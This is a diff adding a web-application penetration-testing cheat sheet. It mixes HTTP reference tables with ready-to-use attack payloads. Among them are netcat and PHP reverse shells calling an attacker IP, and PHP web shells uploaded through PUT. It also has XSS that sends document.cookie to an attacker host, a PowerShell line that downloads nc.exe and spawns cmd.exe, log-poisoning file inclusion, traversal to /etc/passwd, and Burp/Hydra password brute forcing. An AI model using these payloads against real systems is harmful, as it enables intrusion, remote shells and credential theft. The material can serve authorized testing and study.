@@ -1,0 +1,570 @@
+Web Apps
+
+
+# HTTP Methods or Verbs
+
+GET         Does not have a body and passes all parameters in the URL
+POST        Send data to a server. Passes all parameters in the body of the request
+PUT         Used for adding content to a web app, common with RESTful APIs
+DELETE      Used for deleting content from a web app, common with RESTful APIs
+HEAD        The web app will only return the response headers, not the body
+OPTIONS     Show a list of HTTP options that the server supports
+CONNECT     Set up a tunnel between a client and a server for SSL encryption or an HTTP proxy
+TRACE       Used for debugging
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# HTTP Response Codes
+
+100  Continue
+200  OK
+301  Moved Permanently
+302  Found
+304  Not Modified
+400  Bad Request
+401  Unauthorized
+403  Forbidden
+404  Not Found
+500  Internal Server Error
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Browser Redirection
+
+<iframe SRC="http://<attacker IP>/report" height = "0" width ="0">
+hacker:  use Metasploit browser autopwn
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Cisco Router
+
+x is between 15 and 99.
+https://target.com/level/x/exec/-/show
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# ColdFusion
+
+/CFIDE/administrator/ 
+/CFIDE/debug/cf_debugFr.cfm
+/CFIDE/debug/cf_debugFr.cfm?userPage=../../etc/hosts
+/debug/cf_debugFr.cfm
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Command Injection
+
+http://target.com/test.php?cmd=whoami
+http://target.com/test.php?cmd=nc -e /bin/sh <attacker IP> 443
+
+- Chain together commands
+;ls -la
+&&ls -la
+
+- Using commands with arguments when spaces are filtered
+&&{ls,-la}
+
+- PHP command injection using a GET request
+<?php echo system($_GET["cmd"]);?>
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Cookie Security Issues - missing HttpOnly or Secure attribute
+
+HttpOnly - prevents JavaScript from accessing the cookie
+Secure - only send over an encrypted channel
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Cross-site Scripting (XSS)
+
+- Types
+Reflected XSS     Malicious script comes from the current HTTP request. Example: search box
+Stored XSS        Malicious script comes from the website's database. Example: guest book
+DOM-based XSS     Vulnerability exists in client-side code rather than server-side code.
+
+<script>alert(1)</script>
+<script>alert('xss')</script>
+<script>alert(document.cookie)</script>
+
+<iframe src="http://<attacker IP/test.js>" height="0" width="0"></iframe>
+<img src="http://<attacker IP>/test.png" onload="javascript:alert('xss')"/>
+<script>new Image().src="http://<attaker IP>/test.php?output="+document.cookie;</script>
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Directory Traversal
+
+http://target.com/loadImage?filename=1
+
+Use Burp Proxy > Forward
+Step through the loading process.
+When you see how the image/page is being loaded, right click in the body > Send to Repeater
+Repeater > Request
+Modify the file path > Send
+
+- Linux
+     filename=/etc/passwd                             Absolute path
+     filename=../../../etc/passwd                     Traversal
+     filename=....//....//....//etc/passwd            Nested traversal
+     filename=..%252f..%252f..%252fetc/passwd         Superfluous URL decode
+     filename=/var/www/images/../../../etc/passwd     Validation of start of path
+     filename=../../../etc/passwd%00.png              Validation of end of path
+
+- Windows
+     filename=\windows\win.ini                        Absolute path
+     filename=..\..\..\windows\win.ini                Traversal
+     filename=....\/....\/....\/etc/passwd            Nested traversal
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# DOM
+
+Document object model
+
+Page Source - pre DOM
+View Selection Source - post DOM
+Inspector - post DOM
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# File or PUT Upload Vuln
+
+Create a PHP file called shell.php
+
+<?php
+$cmd=$_GET["cmd"];
+$decode=base64_decode($cmd);
+os.system($decode);
+?>
+
+curl -ikL -T shell.php http://target.com/shell.php
+Once the file has been uploaded, pass base64 encoded commands to it to get basic code execution
+
+- Method 2
+curl -ikL -X PUT -d '<?php system($_GET["c"]);?>' http://target.com/shell.php
+
+wget -O output -o /dev/null www.target.com/test.php?cmd=$(echo id|base64)
+wget -O output -o /dev/null www.target.com/test.php?cmd=$(echo ifconfig|base64)
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Fuzzing
+
+When fuzzing headers, disable URL Encode.
+When you are inside of a POST parameter, always use URL encoding.
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Headers, Apache version, eTag, HTTP Basic Authentication Enabled
+
+nc target.com 80
+HEAD / HTTP/1.0
+(hit enter 2x)
+
+curl -ikL -X HEAD target.com
+
+for i in `cat 80.txt` ; do curl -ikL -X HEAD http://$i/ > $i 2>&1 ; echo Scanned $i ; done
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# HTTP methods allowed
+
+nc target.com 80
+OPTIONS / HTTP/1.0
+(hit enter 2x)
+
+curl -ikL -X OPTIONS target.com
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# iframe
+
+<iframe src="http://<attacker IP>" width="1" height="1"></iframe>
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Local File Inclusion
+
+http://target.com/test.php?page=/etc/passwd
+
+- method 2
+nc target.com 80
+GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
+Host: target.com
+Connection: close
+
+Send as cmd payload via http://target.com/index.php?page=../../../../../var/log/apache2/access.log&cmd=id
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# PHP version
+
+nc target.com 80
+GET / HEAD/1.0
+
+http://target.com/aaaaa.php
+
+Firefox > Web Developer Toolbar > Information > View Response Headers
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Remote Code Execution
+
+<?php system("nc 192.168.1.5 443 -e /bin/bash")?>
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Remote File Inclusion
+
+http://target.com/test.php?page=http://<attacker IP>/test.txt
+
+- method 2
+<?php system("powershell -Command \"& {(New-Object System.Net.WebClient).DownloadFile('http://<attacker IP>/netcat/nc.exe','nc.exe'); cmd /c nc.exe <attacker IP> 443 -e cmd.exe\" }"); ?>
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# URL Encoding
+
+Reserved characters     @ $ & + = ; : , / ?
+Unsafe characters       space " < > # % { } | \ ^ ~ [ ] `
+
+%20       space
+%2E   .   period
+%2F   /   forward slash
+%23   #
+%3F   ?
+%26   &   ampersand
+%25   %
+%2B   +
+%40   @   at
+%27   '   single quote
+%22   "   double quote
+%3C   <   less than
+%3E   >   greater than
+
+Example: <script>alert(document.cookie);</script>
+Encoded: %3Cscript%3Ealert%28document%2Ecookie%29%3B%3C%2Fscript%3E
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# WebDAV extensions are enabled
+
+msfconsole
+use auxiliary/scanner/http/webdav_scanner
+
+./davtest.pl -url http://target.com
+
+for i in $(cat 80.txt); do cadaver -t $i; done
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# WordPress
+
+wpscan --url http://target --enumerate p --enumerate t --enumerate u
+wpscan --url http://target -U users.txt -P passwords.txt
+
+cd /usr/share/wpscan/
+stop_user_enumeration_bypass.rb www.target.com --ids 1-1000
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# XML Injection
+
+Single quote        foo'
+Double quote        foo"
+Greater than        foo>
+Less than           foo<			
+Comment tag         foo<!--
+Ampersand           &foo
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Example Assessment
+
+- Initial recon
+ping target.com
+whois <IP>
+whois target.com
+dig target.com
+
+- Service enumeration
+nmap -Pn -n -T4 --open -p- -A target.com
+nmap -Pn -n -T4 --open -sU -sV target.com
+wafw00f https://www.target.com
+whatweb https://target.com
+
+- SSL/TLS enumeration
+sslscan https://target.com
+sslyze https://target.com
+
+- Default configurations and files
+nikto -h https://target.com -port 443 -Format htm --output target.htm
+
+- Application specific enumeration
+davtest -url https://target.com
+droopescan scan drupal -u https://target.com
+ftp <target IP>
+     wget --mirror ftp://<user:password>@<target IP>
+joomscan -u https://target.com
+uniscan -u https://www.target.com -qweds
+wpscan --url https://target.com --enumerate vp,vt,cb,u,m
+
+- Bruteforce directories
+Create a custom wordlist
+cewl https://target.com/ > dict.txt
+
+gobuster dir -u https://target.com -w /opt/SecLists/Discovery/Web-Content/raft-small-directories.txt --wildcard > small.txt
+cat small.txt | grep -v 403 | grep Status
+
+gobuster dir -u https://target.com -w /opt/SecLists/Discovery/Web-Content/CMS/sharepoint.txt --wildcard > share.txt
+cat share.txt | grep -v 403 | grep Status
+
+If the webiste used PHP, use -x php
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Setup Burp Suite Pro
+
+Target > Site map:
+    Right click on any pane > View > Tabs
+    Filter bar > click on the gear > Restore defaults
+
+Proxy > Options > Intercept Client Requests:
+    Enable URL and click Up to move to the top
+    Select File extension > Edit > copy the Match condifion > OK
+
+Proxy > Options > Intercept Server Responses:
+    Enable Intercept responses based on the following rules
+    Enable URL and click Up to move to the top
+    Add: And, File extension, Does not match, Match condition: paste contents from above, OK
+
+Intruder > Options > Request Engine
+    Number of threads: 8
+    Number of retries on network failure: 2
+
+User options > Connections > Platform Authentication > enable Prompt for credentials on platform authentication failure
+
+User options > Display
+    User Interface > Font size: 16
+    HTTP Message Display > Font: Courier 18
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Testing from home? Tunnel all your traffic over SSH to Kali running in Amazon EC2.
+
+ssh -i amazon.pem ec2-user@kaliIP
+sudo -i
+vim /etc/proxychains.conf
+Add a new last line: socks5 127.0.0.1 1080
+exit
+exit
+
+ssh -D 1080 -f -N -i amazon.pem ec2-user@kaliIP
+
+Open Burp locally.
+User options > Connections > SOCKS Proxy
+Check Use SOCKS proxy
+SOCKS Proxy host: 127.0.0.1
+SOCKS Proxy port: 1080
+Check Do DNS lookups over SOCKS proxy
+
+Open embedded browser to http://whatismyipaddress.com
+The IP address should be your Kali EC2.
+Target > Site map: this should now populate
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+- New scan
+Start Burp > Open existing project: uncheck Pause Automated Tasks
+New project on disk
+Enter a name
+Tab > rename the file if needed > Next > Start Burp
+
+- Establish scope
+Proxy > turn off the Interncept
+Open browser > browse to the target site
+Target > Site map: this should be populating
+Right click on the target URL > Add to scope
+Proxy history logging: Yes
+Filter bar > enable Show only in-scope items
+
+- Browse the target
+Look for /robots.txt and /sitemap
+If either page exists, hold down on the Command button (Apple) and click on every link.
+Follow links, submit forms and login when prompted.
+Continue until you have thoroughly mapped the target.
+Target > Site map
+Locate any logout pages > right click > Remove from scope
+
+- Unrequested items
+Target > Site map > right click on the URL > Expand branch
+Look for items are shown in gray.
+Sort the top right pane by Time requested.
+This will group together the unrequested items.
+Right click on each item > Copy URL > paste in your browser.
+
+- Brute force directories
+Target > Site map > right click on the second line '/' > Send to Intruder
+Intruder > Position > Attack type: Sniper
+Clear §
+On the top line, select the forward slash '/' after GET > Add §
+Move the forward slash in front of the two symbols. It should look like: GET /§§
+Payloads > Payload Sets > Payload set: 1 > Payload type: Runtime file
+Payloads > Payload Options > Select file > raft-medium-directories.txt > Open
+Start attack
+
+- Sync results to Site map
+Scroll to the top of the list > sort by Payload
+Delete any blanks lines
+Move the Intruder window to the side so you can see the main window
+Target > Site map
+Compare the pages in the Site map to the Payloads in the Intruder window.
+Select a Payload that is not listed in the Site map
+Right click > Request in browser > In current session
+Enable In future, just copy the URL and don't show this dialog > Copy
+Open a new tab in Chromium and paste.
+Repeat as necessary.
+
+- Analyze anomolies
+Filter bar > uncheck 4xx [request error]
+Click Status to sort by ascending.
+Select the first line with a 302 Status.
+Hold down shift and select the last line with a 302 Status.
+Right click > Delete selected items > Yes
+Review uncomman HTTP status codes (5xx) > Response > Render
+Sort by Length, review minimum and maximum values > Response > Render
+
+- Attack surface
+Target > Site map > right click on the target URL > Engagement tools > Target analyzer
+Show the dynamic URLs, static URLs and parameters
+
+- Review comments
+Target > Site map > right click on the target URL > Engagement tools > Find comments
+Sort by Item
+Select each line > Response > right arrow key
+Look for sensitive information.
+
+- Visit referenced URLs
+Target > Site map > right click on the target URL > Expand branch
+Scroll to the very bottom.
+Right click on any empty folders that are greyed out > Delete branch > Yes
+Right click on any pages that are grey or red > Copy URL > Chromium > Paste & Go
+Skip pages that end with css, jpg, js, pdf or png.
+Make sure at least one page has been visited under each folder.
+Select multiple URLs by holding down shift > right click > Copy selected URLs
+Chromium > select the + on the far right to access 'Open Multiple URLs' > paste > Open URLs
+Burp > once the URLs become black > Chromium > close the open tabs.
+
+- Scan the target
+Target > Site map > right click on the target URL > Actively scan this host
+
+- Capture a packet
+Burp > Proxy > enable intercept
+Chromium > try to login to a web page.
+Burp > right click on capture > Send to Intruder
+Intruder > Position > Attack type
+
+- Types of attack
+Sniper:
+    Uses a single wordlist against a single variable.
+Battering ram:
+    Uses a single wordlist against all variables.
+Pitchfork:
+    Uses multiple wordlists.
+    For example: you have a known list of usernames and a related list of passwords.
+    This will try the first username with the first password, then the second username with the second password, and so on.
+    This is useful when checking for old accounts that should have been deleted.
+Cluster bomb:
+    Uses multiple wordlists.
+    For example: you have a known list of usernames and a non-related list of passwords.
+    This will try the first username with each password, then the second username with each password, and so on.
+
+- Brute force a password: Sniper
+    Clear $
+    Highlight the password you entered > Add $
+    Intruder > Payloads > Payload Options
+    Load > choose a password list > Open
+    Start attack
+    Filter bar > uncheck 4xx [request error]
+    Click Status to sort by ascending.
+    Look for a 302 (redirect). This should be a successful login.
+
+- Brute force usernames and passwords: Cluster bomb
+    Clear $
+    Highlight the username you entered > Add $
+    Highlight the password you entered > Add $
+    Intruder > Payloads > Payload Sets
+        Payload set: 1
+        Payload type: Simple list
+    Intruder > Payloads > Payload Options
+    Clear > Load > choose a username list > Open
+    Intruder > Payloads > Payload Sets
+        Payload set: 2
+        Payload type: Simple list
+    Intruder > Payloads > Payload Options
+    Clear > Load: choose a password list > Open
+    Start attack
+    Filter bar > uncheck 4xx [request error]
+    Click Status to sort by ascending.
+    Look for a 302 (redirect). This should be a successful login.
+
+- Other methods
+Hydra
+    hydra -L users.txt -P pass.txt <target IP> http-get
+
+Metasploit
+    use auxiliary/scanner/http/http_login
+    set user_file user.txt
+    set pass_file pass.txt
+    set rhosts <target IP>
+    set stop_on_success true
+    exploit
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Check for 404 and 500 errors
+
+Add junk to the middle of a URL.
+Add a single tick (') at the end of a URL.
+Enter a single tick (') in any input field of a form and submit.
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# CSRF
+
+Login to the target.
+Create a list of all POST requests that do not have a unique token called ‘CSRF_Token’.
+
+Proxy > HTTP history > Filter bar > Filter by search term
+    ^POST((?!CSRF_Token).)*$
+    Click Regex
+
+Right click on the first request > Engagement tools > Generate CSRF PoC
+Test in browser > Copy
+Open a new tab in Chroomium > paste
+Look for evidence that it executed whatever that HTTP request was supposed to do.
+
+https://portswigger.net/support/using-burp-to-test-for-cross-site-request-forgery-csrf
+https://portswigger.net/burp/documentation/desktop/functions/generate-csrf-poc
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Manually Validate Findings
+
+File path traversal: right click in the Request body > Send to Repeater > modify the request
+XML Injection: Search in the Response body for http://www.w3.org/2001/XMLSchema.
+This is a false positive.
+XSS: right click in the Request body > Request in browser > In current browser session
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Mobile app testing
+
+Proxy > Options > Proxy Listeners > Add > Binding:
+    Bind to port: 8081
+    Bind to address: All interfaces
+    OK > Yes
+
+iPhone: Settings > Wi-Fi > select your network > scroll to the bottom
+HTTP PROXY > Manual
+    Server: your computer's IP address.
+    Port: 8081
+
+Safari > http://burp
+    Select CA Certificate
+    It will prompt you to install, then ask for your password
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Reporting
+
+Removed false positives.
+Select all remaining findings.
+Right click > Report selected issues > Next 4x > enter file location > Next > Close
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Right click on the very first request >  Send to intruder
+Clear
+Put your curser right after the / > click Add
+Payload Sets > Payload type: Runtime file
+Payload Options > Select file: sec lists > Discovery > Web_content > raft-medium-directories
+Start attack
+sort by Status
+    500  Server message
+    405  Method not allowed
+
+- User-Agent Switcher
+Intruder > clear > select user agent string > Add
+Payload Options > Select file: sec lists > Discovery > Web_content > UserAgents.fuzz.txt
+Sort by Length > Response > Render
+
